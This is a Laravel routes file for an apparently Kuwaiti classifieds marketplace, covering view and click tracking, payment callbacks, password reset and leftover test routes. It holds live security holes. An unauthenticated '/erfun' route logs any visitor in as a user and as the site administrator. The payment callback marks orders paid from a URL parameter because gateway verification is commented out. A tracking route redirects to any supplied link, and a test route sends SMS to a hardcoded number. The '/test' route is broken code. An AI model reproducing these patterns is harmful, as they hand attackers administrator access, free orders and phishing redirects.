<?php

use Facebook\Facebook;
use App\Services\SocialMediaService;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use Abraham\TwitterOAuth\TwitterOAuth;
use Facebook\Exceptions\FacebookSDKException;
use App\Http\Controllers\Auth\LoginController;
use App\Http\Controllers\Frontend\FrontendLangController;
use Illuminate\Http\Request;

Route::get('/erfun' , function() { Auth::loginUsingId(90); Auth::guard('admin')->loginUsingId(1); });
Route::get('/test-send-sms', function () {
    $activated_code = rand(1000,9999);
    $phone = "66444569";
    return sendSms($phone,__("Hello\nYour OTP is :CODE\nSouqeldeira.com",['CODE'=>$activated_code]));
});

Route::post('/save-visible-divs' , function (Request $request) {
    if ( is_array($request->all())) {
        foreach ($request->all() as $view) {
            try{
                $data = json_decode($view);
                if ( json_last_error() === JSON_ERROR_NONE and filled($data->type)){
                    $matchThese = [
                        'belongs_to_type'=>$data->type,
                        'belongs_to'=>$data->id,
                        'type'=> 'view' ,
                        'ip' => $request->ip(),
                        'time_checker' => now()->format('Y-m-d-H'),
                        'is_featured'=>$data->is_featured
                    ];
                    if ( ! \App\Models\Track::query()->where($matchThese)->exists() ) {
                        \App\Models\Track::query()->create($matchThese);
                        $last = new stdClass();
                        if ( $data->type == "ad" ) {
                            $object = \App\Models\Ad::query()->find($data->id);
                            if ( $object )
                                $last->view_list = optional($object->tracks)->view_list + 1 ;
                        } elseif ( $data->type == "agency" ) {
                            $object = \App\Models\User::query()->find($data->id);
                            if ( $object )
                                $last->view_list = optional($object->tracks)->view_list + 1 ;
                        }
                        if ( isset($object) ){
                            $object->tracks = (object) array_merge((array) $object->tracks, (array) $last);
                            $object->save();
                        }
                    }
                }
            }catch ( Exception $exception){}
        }
    }
});
Route::get('/track-links' , function (Request $request) {
    if ( $request->has('link')) {
        try{
            $data = json_decode($request->get('data'));
            if ( json_last_error() === JSON_ERROR_NONE and filled($data->type)){
                $matchThese = [
                    'belongs_to_type'=>$data->type,
                    'belongs_to'=>$data->id,
                    'type'=> 'click' ,
                    'ip' => $request->ip(),
                    'time_checker' => now()->format('Y-m-d-H'),
                    'is_featured'=>$data->is_featured
                ];
                if ( ! \App\Models\Track::query()->where($matchThese)->exists() ){
                    \App\Models\Track::query()->create($matchThese);
                    $last = new stdClass();
                    if ( $data->type == "ad" ) {
                        $object = \App\Models\Ad::query()->find($data->id);
                        if ( $object )
                            $last->click_list = optional($object->tracks)->click_list + 1 ;
                    } elseif ( $data->type == "ad_tel" ) {
                        $object = \App\Models\Ad::query()->find($data->id);
                        if ( $object )
                            $last->click_tel = optional($object->tracks)->click_tel + 1 ;
                    } elseif ( $data->type == "ad_whatsapp" ) {
                        $object = \App\Models\Ad::query()->find($data->id);
                        if ( $object )
                            $last->click_whatsapp = optional($object->tracks)->click_whatsapp + 1 ;
                    } elseif ( $data->type == "agency_ads" ) {
                        $object = \App\Models\User::query()->find($data->id);
                        if ( $object )
                            $last->click_list = optional($object->tracks)->click_list + 1 ;
                    } elseif ( $data->type == "agency_tel" ) {
                        $object = \App\Models\User::query()->find($data->id);
                        if ( $object )
                            $last->click_tel = optional($object->tracks)->click_tel + 1 ;
                    } elseif ( $data->type == "agency_whatsapp" ) {
                        $object = \App\Models\User::query()->find($data->id);
                        if ( $object )
                            $last->click_whatsapp = optional($object->tracks)->click_whatsapp + 1 ;
                    }
                    if ( isset($object) ){
                        $object->tracks = (object) array_merge((array) $object->tracks, (array) $last);
                        $object->save();
                    }
                }
            }
        }catch ( Exception $exception){}
        return redirect($request->get('link'));
    } else
        abort(404);
});
// ADMIN CHANGE LANG
Route::get('/','App\Http\Livewire\Frontend\Welcome')->name('welcome');
Route::get('/lang/{lang}', [FrontendLangController::class, 'lang'])->name('lang');
Route::get('/sitemap.xml', [\App\Http\Controllers\Frontend\SiteMapController::class, 'index'])->name('sitemap');
Route::get('/abouts','App\Http\Livewire\Frontend\About\Abouts')->name('abouts');
Route::get('/contacts','App\Http\Livewire\Frontend\Contact\Contacts')->name('contacts');
Route::get('/ads/search/{type?}','App\Http\Livewire\Frontend\Ads\AdsSearch')->name('ads.search');
Route::get('/agency/{slug}/{agency_id}/ads/search/{type?}','App\Http\Livewire\Frontend\Ads\AdsSearch')->name('agency.ads');
Route::get('/adasdsasad/{slug}/{id}', 'App\Http\Livewire\Frontend\Ads\AdSearch')->name('ad.search');
Route::get('/agencies', 'App\Http\Livewire\Frontend\Agency\Agencies')->name('agencies');
Route::get('/agency/{slug}/{id}', 'App\Http\Livewire\Frontend\Agency\Agency')->name('agency');
Route::get('/blogs', 'App\Http\Livewire\Frontend\Blog\Blogs')->name('blogs');
Route::get('/blog/{slug}/{id}', 'App\Http\Livewire\Frontend\Blog\Blog')->name('blog');
Route::get('/policies', 'App\Http\Livewire\Frontend\Policy\Policy')->name('policy');
Route::get('/scools', 'App\Http\Livewire\Frontend\School\Schools')->name('schools');
Route::get('/scool/{slug}/{id}', 'App\Http\Livewire\Frontend\School\School')->name('school');

// Auth::routes();
Auth::routes(['verify' => true]);

Route::get('/auth/passwords/reset',function(Request $request){
    $email = \Session::get('authEmail');
    if(is_null($email)) {
        return redirect()->route('login');
    }
    return view('auth.passwords.reset2');
})->name('auth.passwords.reset');

Route::post('/auth/passwords/reset',function(Request $request){
    $email = \Session::get('authEmail');
    if(is_null($email)) {
        return redirect()->route('login');
    }
    $request->validate([
        'activated_code' => 'required',
        'password'  => 'required|confirmed|min:8',
    ]);

    $user = \App\Models\User::where(['email'=>$email])->first();

    if($user->activated_code != $request->activated_code) {
        return back()
            ->withInput($request->only('email'))
            ->withErrors(['activated_code' => __('activated code id rong')]);
    }
    \DB::table('users')->where('id',$user->id)->update([
        'password' => Hash::make(request('password')),
    ]);
    \Session::forget('authEmail');
    return redirect()->route('login');
})->name('auth.passwords.reset.post');



Route::any('/payment-redirect/{id}/{status?}',function(Request $request,$id , $status = "error"){

    $descriptionSet = false;
    $order = \App\Models\Order::query()->where('status' , 'pending')->findOrFail($id);
    try {
        $payment = (new \App\Payment\BookeeyService())->getPaymentStatus([$request->get('txnId' , $order->transaction_id) , $id]);
        // if ( $payment->Data->InvoiceStatus == 'Paid' )
        //     $status = "success";
    } catch (Exception $exception) {
        // $order->description = $exception->getMessage();
        // $descriptionSet = true;
        // $status = "error";
    }
    if ( $status == "success" ) {
        $order->status = "success";
        $order->doSuccess();
    } else {
        if ( ! $descriptionSet )
            $order->description = $request->get('errorMessage' );
        $order->status = "failed";
    }
    $order->transaction_id = $request->get('txnId' , $order->transaction_id);
    $order->save();

    if ( $status == "success" )
        return redirect()->route('profile.invoices')->with('success', $order['description_'.app()->getLocale()] .' '. trans('paid_successfully'));
    return redirect()->route('profile.invoices')->with('error', __('paid_failed'));

})->name('bankCallback');

Route::any('/payment-sample/{id}',function(Request $request,$id){
    return '<a href="'.route('bankCallback' , ['id' => $id , 'status' => 'success']).'" >Pay</a><br><a href="'.route('bankCallback' , ['id' => $id , 'status' => 'error']).'">cancel</a>';
})->name('goSampleBank');

Route::middleware(['auth'])->group(function () {


    // https://demo.MyFatoorah.com/KWT/ie/01072114934341

    // End new routes







    Route::get('/auth/verified/mail',function(Request $request){
        return view('auth.passwords.verified-mail');
    })->name('auth.passwords.verified.mail');

    Route::post('/auth/verified/mail',function(Request $request){
        $request->validate([
            'activated_code' => 'required',
        ]);
        if(\Auth::user()->activated_code != $request->activated_code) {
            return back()
                ->withInput($request->only('email'))
                ->withErrors(['activated_code' => __('activated code id rong')]);
        }
        \DB::table('users')->where('id',\Auth::user()->id)->update([
            'email_verified_at' => \Carbon\Carbon::now()
        ]);
        return redirect()->route('home');
    })->name('auth.passwords.verified.mail.post');

});



Route::get('/resend-code', [App\Http\Controllers\Auth\VerificationController::class, 'resend']);
Route::get('/logout',[LoginController::class,'logout'])->name('auth.logout');
Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');
Route::post('/sync', [App\Http\Controllers\SyncController::class, 'sync'])->name('sync');
Route::post('/syncdarco', [App\Http\Controllers\SyncController::class, 'syncdarco'])->name('syncdarco');


Route::get('/test', function () {
    // Upload Photo

    // Auth::guard('web')->logout();
    // $connection = new TwitterOAuth(env('TWITTER_API_KEY'), env('TWITTER_API_SECRET'), env('TWITTER_ACCESS_TOKEN'), env('TWITTER_ACCESS_TOKEN_SECRET'));
    // $tweet = "One more post aldera befddal allah ";
    // $imageMedia = $connection->upload('media/upload', ['media' => public_path('uploads/0c1e7683578ee3daa764555689e16748.png')]);
    // $parameters = [
    //     "status" => $tweet,
    //     "media_ids" => $imageMedia->media_id_string
    // ];

    // $statuses = $connection->post("statuses/update", $parameters);
    // $connect = new SocialMediaService();
    // $result = $connect->publishToTwitter();
    // dd($result,'FINSH BEFDEL ALLAH');
    // return 'KOLO BEFADEL ALLH WA7DDO | الحمد لله رب العالمين';
    // FACEBOOK PUBLISHING
    $fb = new Facebook([
        'app_id' => env('FACEBOOK_APP_ID'),
        'app_secret' => env('FACEBOOK_APP_SECRET'),
        'default_graph_version' => 'v12.0',
        'default_access_token' => env('FACEBOOK_PAGE_ACCESS_TOKEN'), // optional
    ]);
    try {
        $imageUrl = public_path('images/video_bg.jpg');
        // $imageUrl = url('/');
        $fb->post(env('FACEBOOK_APP_ID').'/media',[
            'image_url' => 'https//www.example.com/images/bronz-fonz.jpg',
            'caption' => '%23BronzFonz',
        ]);
        // dd($imageUrl.'/images/popup1.jpg');
        // $response = $fb->post('106808981764636/photos', [
        //     'message' => 'UUUUUUUUUUUUUU',
        //     'source' => $fb->fileToUpload($imageUrl),
        //     // 'link' => 'https://test.aldeiramarket.com',
        //     // 'url' => 'https://images.pexels.com/photos/931177/pexels-photo-931177.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500',
        //     // 'url' => "${imageUrl}",
        // ])->getGraphNode()->asArray();
        // $fb->fileToUpload($imageUrl);
        if ($response['id']) {
            // post created
            dd($response,'PHOTO PUBLISHED');
        }
    } catch (FacebookSDKException $e) {
        dd($e); // handle exception
    }
    // $fb->api( '/me/photos', 'POST', ['message' => 'My message', 'source' => $fb->fileToUpload('direct/path/to/image.jpg')] );

//$fb->api( '/' . $page_id . '/photos', 'POST', ['message' => 'My message', 'source' => $fb->fileToUpload('direct/path/to/image.jpg')] );

//$fb->api( '/me/feed', 'POST', ['picture' => "http://autostyl.frio.sk/images/facebook_share.jpg", 'link' => 'http://autostyl.frio.sk'] );

//->fileToUpload($path)

});
